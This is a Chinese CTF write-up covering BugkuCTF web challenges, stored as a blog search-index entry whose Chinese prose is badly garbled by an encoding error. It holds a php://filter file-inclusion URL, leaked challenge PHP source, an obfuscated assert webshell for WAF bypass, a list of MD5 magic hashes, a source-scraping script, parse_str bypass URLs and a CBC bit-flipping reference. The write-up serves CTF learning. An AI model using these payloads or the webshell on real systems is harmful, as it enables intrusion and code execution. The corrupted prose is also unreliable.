    <content type="text"><![CDATA[welcome to bugkuctf ctrl + UæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œ å¦‚æžœæœ‰ $userä¸” file_get_contents($user, 'r') çš„ å€¼æ˜¯ æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚ å°±ä¼š include $file çš„å†…å®¹ ã€‚ å¹¶ä¸”æç¤ºæ˜¯ hint.phpè¿™ä¸ªæ–‡ä»¶ è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªæ€Žä¹ˆæŠŠ get æ–¹æ³•ä¼ å…¥çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ–‡ä»¶æ‰“å¼€ã€‚ phpä¼ªåè®® è¿™é‡Œç”¨åˆ°äº† php://input ä½†æ˜¯ã€‚ã€‚ è¿™å°±è¦ç”¨åˆ°ç¬¬äºŒä¸ªä¼ªåè®®ï¼š php://filter æˆ‘é‚£æ ·ä¼ é€’å‚æ•°ä¼šæŠ¥é”™ï¼Œ include($file) åªæ˜¯æŠŠ $file è¿™ä¸ªå˜é‡å½“ä½œæ–‡ä»¶ååŒ…æ‹¬è¿›åŽ»äº†ã€‚ å°±æ˜¯å«åœ¨æºä»£ç é‡Œï¼Œ ä¸æ˜¯ç®€å•åœ°æž„é€ ä¸€ä¸ªå‚æ•°å°±èƒ½è¾¾åˆ°çš„ã€‚ è¿™å°±æ˜¯ä¸€ä¸ªæ³„éœ²äº†æºç çš„æ¼æ´žäº†ã€‚ æœ€åŽæž„é€ çš„URLå¦‚ä¸‹ï¼š http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php æƒŠå¹ã€‚ base64 è§£å¯†ä¹‹åŽçš„æºä»£ç ã€‚ 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; ä»£ç é‡Œé¢æž„é€ äº†ä¸€ä¸ªç±»ã€‚ å…¬æœ‰å˜é‡æ˜¯ $file ç»§ç»­çœ‹ä¸€ä¸‹ index.php çš„æºä»£ç  123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "Ã¤Â¸ÂÃ¨ÂƒÂ½Ã§ÂŽÂ°Ã¥ÂœÂ¨Ã¥Â°Â±Ã§Â»Â™Ã¤Â½ flagÃ¥Â“Â¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; æœ‰å‡ ä¸ªåœ°æ–¹æš‚æ—¶å†™ä¸åˆ°ä½ï¼Œ å…ˆåˆ°è¿™é‡Œå¥½äº†ã€‚ è¿‡ç‹—ä¸€å¥è¯ å¾ˆè’™ 1234&lt;?php $poc="a#s#s#e#r#t";$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; ä¸Šé¢æ˜¯é¢˜ç›®æç¤ºçš„è¿‡ç‹—ä¸€å¥è¯ä»£ç ã€‚ ç„¶åŽ...åŽé¢çš„ä¸ä¼šäº† å­—ç¬¦ï¼Œæ­£åˆ™ï¼Ÿ å‰å¥³å‹ ä¸€é“å¾ˆæœ‰è¶£çš„é¢˜ç›®ï¼Œ å°±ä¸è¯´é¢˜ç›®äº†ï¼Œ ç›´æŽ¥æ”¾æˆ‘çš„æµ‹è¯•ä»£ç  123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å‘çŽ°getè¿˜èƒ½ä¼ é€’æ•°ç»„ï¼ˆä¸è¿‡å½“ç„¶æ˜¯ä¸€å †çš„é”™è¯¯ï¼‰ MD5 collision è¿˜ä¸å¤ªæ¸…æ¥šMD5 ç¢°æ’žæ˜¯å•¥ï¼Œ ä»¥åŽè¡¥å‘ payload 120.24.86.145:9009/md5.php?a=s878926199a å¸¸ç”¨çš„MD5ç¢°æ’ž 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 ç§‹åå±±è€å¸æœº 123456789101112&lt;head&gt;&lt;title&gt;ä¸‹é¢çš„è¡¨è¾¾å¼çš„å€¼æ˜¯ç§‹åå±±çš„è½¦é€Ÿ&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;äº²è¯·åœ¨2så†…è®¡ç®—è€å¸æœºçš„è½¦é€Ÿæ˜¯å¤šå°‘&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; ä¸¤ç§’ä¹‹å†…è®¡ç®—å‡ºå¼å­ä¸­çš„å€¼ï¼Œ å†æäº¤ èœé¸¡è¿˜ä¸å¤ªä¼šå†™è„šæœ¬ å‚è€ƒäº†dalaoä»¬çš„ä»£ç  123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) ä¸è¿‡è¿˜æ˜¯æ²¡æžå‡ºæ¥ã€‚ å¤ä¹ ä¸€ä¸‹requestsåº“ 1234567import requests#æž„é€ requestså¯¹è±¡s = requests.get(url)s.post(url, )#å·®ä¸å¤šå°±è¿™äº›äº† cookiesæ¬ºéª— ç„¶è€Œæ³¨æ„åˆ°URLä¸­çš„lineå’Œfileæ—¶å°±èƒ½åšå‡ºæ¥äº†ã€‚ 1234567#ç”¨è„šæœ¬æŠŠä»£ç è·‘å‡ºæ¥import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //çœ‹è¿™é‡Œ $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; æž„é€ cookieå°±è¡Œå•¦ ï¼ˆç„¶è€Œæ²¡æžå‡ºflagæ¥ï¼‰ login4 CBCå­—èŠ‚ç¿»è½¬æ”»å‡» æ”¾ä¸€å¼ ç»å…¸çš„å›¾ æ®å¸ˆå‚…ä»¬çš„wpè¯´æ˜¯æœ‰ä¸€ä¸ªindex.php.swpæ–‡ä»¶å­˜åœ¨ã€‚ ç„¶è€Œæ²¡æ‰¾åˆ°ï¼Œ å…ˆæŠŠå¸ˆå‚…ä»¬æ‰¾åˆ°çš„æºç æ”¾ä¸Šæ¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ æ ¹æ®ä»¥å‰åšé¢˜çš„ç»éªŒï¼Œ å¤‡ä»½å°±æ˜¯åœ¨æç¤ºä½  å­˜åœ¨bakæ–‡ä»¶ æ‰€ä»¥ç›´æŽ¥è¾“å…¥URLä¸º http://123.206.87.240:8002/web16/index.php.bak ç„¶åŽä¸‹è½½æ–‡ä»¶ ä»£ç ï¼š 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."å–å¾—flag";&#125;?&gt; åšä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œ è¿˜æ˜¯ä¸»è¦é è‡ªå·±å°è¯•ã€‚ 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; ä¸Šé¢æ˜¯æˆ‘ç”¨æ¥æµ‹è¯•çš„ä»£ç  æž„é€ URLä¸º http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2 è¾“å‡ºäº†è¿™äº›ï¼š 123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c ä¹‹å‰è¿˜å¾ˆç–‘æƒ‘ä¸ºä»€ä¹ˆæ²¡æœ‰getéƒ½èƒ½å¾—åˆ°å˜é‡ï¼Œ åŽŸæ¥æ˜¯parse_strè¿™ä¸ªå‡½æ•°åœ¨èµ·ä½œç”¨ã€‚ OKï¼Œ çŽ°åœ¨å°±æ˜¯è¡¨æ¼”çš„æ—¶é—´äº†ã€‚ å‚è€ƒèµ„æ–™ https://blog.csdn.net/wy_97/article/details/77431111 https://www.cnblogs.com/Pinging/p/8278168.html https://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 ç§‹åå±±è€å¸æœº cookieæ¬ºéª— CBCå­—èŠ‚ç¿»è½¬æ”»å‡» python requestsåº“å­¦ä¹ ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
